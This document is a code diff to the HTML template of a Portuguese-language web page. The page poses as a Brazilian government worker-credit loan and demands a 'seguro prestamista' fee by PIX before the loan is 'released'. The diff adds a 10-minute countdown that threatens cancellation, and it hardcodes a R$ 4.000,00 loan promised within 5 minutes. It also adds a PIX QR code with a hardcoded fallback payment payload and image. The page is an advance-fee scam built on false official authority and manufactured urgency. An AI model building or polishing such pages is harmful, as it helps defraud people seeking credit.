@@ -313,6 +313,12 @@
                     <span>ATENÇÃO</span>
                 </div>
                 <p>Para <strong>liberar o empréstimo</strong>, é necessário efetuar o pagamento do <strong>seguro prestamista</strong> conforme determinação do <strong>Conselho Monetário Nacional</strong> (Resolução Nº 3.308 do BCB).</p>
+                
+                <div style="margin: 15px 0; text-align: center;">
+                    <p style="font-weight: 700; font-size: 16px; margin-bottom: 5px;">TEMPO RESTANTE</p>
+                    <div class="timer" id="timer" style="font-size: 32px; font-weight: 700; color: #d61600; margin: 0 auto;">10:00</div>
+                </div>
+                
                 <p style="margin-top: 10px; font-weight: 500;">Se o pagamento do seguro não for realizado em até <strong>10 minutos</strong>, seu empréstimo será <strong>CANCELADO definitivamente</strong>. O benefício será repassado para outro cidadão e você perderá o direito ao empréstimo do Programa Crédito do Trabalhador.</p>
             </div>
 
@@ -336,18 +342,13 @@
                 <p style="margin-top: 1.5rem; font-weight: 600; font-size: 1.1rem;">Este valor será devolvido após o término do seu contrato de empréstimo (36 meses).</p>
             </div>
 
-            <div class="timer-container">
-                <p style="font-weight: 700; font-size: 18px;">CRONÔMETRO</p>
-                <div class="timer" id="timer">10:00</div>
-            </div>
-
-            <div class="qr-container" style="text-align: left; background-color: white; padding: 1.5rem; border-radius: 8px; margin-top: 1.5rem;">
+            <div class="qr-container" style="text-align: left; background-color: white; padding: 1.5rem; border-radius: 8px; margin-top: 1.5rem; width: 100%; max-width: 800px; margin-left: auto; margin-right: auto;">
                 <h3 style="font-weight: 700; font-size: 1.2rem; color: #1351b4; margin-bottom: 20px; text-align: center;">INFORMAÇÕES DO EMPRÉSTIMO</h3>
                 
                 <div style="background-color: #f5f8ff; padding: 20px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 20px;">
                     <div style="margin-bottom: 15px;">
                         <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px;">Valor do Empréstimo:</div>
-                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;">R$ {{ "%.2f"|format(amount|float) }}</div>
+                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;">R$ 4.000,00</div>
                     </div>
                     
                     <div style="margin-bottom: 15px;">
@@ -370,11 +371,18 @@
                         <i class="fas fa-info-circle" style="color: #f39c12; font-size: 1.2rem; margin-right: 10px;"></i>
                         <div style="font-weight: 600; color: #f39c12;">Importante:</div>
                     </div>
-                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong>R$ {{ "%.2f"|format(amount|float) }}</strong> será depositado na conta vinculada ao CPF <strong>{{ cpf }}</strong>.</p>
+                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong>R$ 4.000,00</strong> será depositado em até <strong>5 minutos</strong> na conta vinculada ao CPF <strong>{{ cpf }}</strong>.</p>
                 </div>
             </div>
 
             <div style="margin: 20px 0; display: flex; flex-direction: column; align-items: center;">
+                <div style="display: flex; justify-content: center; margin-bottom: 20px;">
+                    <div style="text-align: center;">
+                        <p style="margin-bottom: 15px; font-weight: 600; color: #1351b4; text-align: center;">QR Code PIX</p>
+                        <img id="pixQrCode" src="{{ pix_qr_code }}" alt="QR Code PIX" style="width: 200px; height: 200px; border: 1px solid #ddd; border-radius: 8px; padding: 10px; background: white; margin: 0 auto 20px;">
+                    </div>
+                </div>
+                
                 <p style="margin-bottom: 15px; font-weight: 600; color: #1351b4; text-align: center;">Ou copie o código PIX</p>
                 
                 <div style="width: 100%; max-width: 600px; margin: 0 auto;">
@@ -382,7 +390,7 @@
                         {{ pix_code }}
                     </div>
                     
-                    <button onclick="copyPixCode()" class="copy-button" style="background-color: #48ad45; color: white; border: none; border-radius: 4px; padding: 10px 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; margin: 0 auto; transition: all 0.3s ease;">
+                    <button onclick="copyPixCode()" class="copy-button" style="background-color: #4FB04B; color: white; border: none; border-radius: 4px; padding: 10px 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; margin: 0 auto; transition: all 0.3s ease;">
                         <i class="fas fa-copy" style="margin-right: 8px;"></i>
                         Copiar código PIX
                     </button>
@@ -391,10 +399,13 @@
                 <script>
                     // Código PIX de fallback (apenas para demonstração)
                     const fallbackPixCode = "00020126870014br.gov.bcb.pix2565pix.primepag.com.br/qr/v3/at/cf353572-41fd-4646-ad5e-eee21082791c5204000053039865802BR5925PAGAMENTO SEGURO INTERMED6006SOBRAL62070503***63043384";
-                    
-                    // Verificar e ajustar o código PIX
+                    const fallbackQrCode = "data:image/png;base64,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";
+
+                    // Verificar e ajustar o código PIX e QR code
                     document.addEventListener('DOMContentLoaded', function() {
                         const pixCodeElement = document.getElementById('pixCode');
+                        const pixQrCodeElement = document.getElementById('pixQrCode');
+                        
                         if (pixCodeElement) {
                             console.log("Código PIX encontrado na página, comprimento: " + pixCodeElement.textContent.trim().length);
                             
@@ -406,6 +417,14 @@
                             
                             // Destacar que este código pode ser copiado
                             pixCodeElement.setAttribute('title', 'Clique no botão abaixo para copiar este código');
+                        }
+                        
+                        if (pixQrCodeElement) {
+                            // Se o QR code estiver vazio, usar o fallback
+                            if (!pixQrCodeElement.src || pixQrCodeElement.src === 'data:,' || pixQrCodeElement.src.length < 100) {
+                                console.log("QR Code inválido, usando fallback");
+                                pixQrCodeElement.src = fallbackQrCode;
+                            }
                         }
                     });
                 </script>
@@ -501,7 +520,7 @@
                             copyButton.style.backgroundColor = '#28a745';
                             setTimeout(() => {
                                 copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
-                                copyButton.style.backgroundColor = '#367c33';
+                                copyButton.style.backgroundColor = '#4FB04B';
                             }, 2000);
                         },
                         function(err) {
